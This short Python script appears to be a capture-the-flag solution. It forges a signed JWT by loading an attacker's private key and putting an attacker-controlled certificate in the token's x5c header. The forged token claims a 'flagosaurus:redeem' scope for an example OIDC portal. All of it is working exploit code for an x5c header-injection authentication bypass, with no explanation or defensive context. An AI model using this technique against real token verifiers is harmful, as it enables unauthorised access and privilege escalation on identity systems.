import jwt, base64, json

with open("attacker.key") as f:
    priv_key = f.read()

with open("attacker_x5c.b64") as f:
    x5c_val = f.read().strip()

header = {
    "alg": "RS256",
    "typ": "JWT",
    "x5c": [x5c_val]
}

payload = {
    "iss": "strataid.example.com",
    "sub": "guest",
    "aud": "trustdinoidc-portal",
    "scope": "openid profile flagosaurus:redeem",
    "exp": 1790101101
}

token = jwt.encode(payload, priv_key, algorithm="RS256", headers=header)
print(token)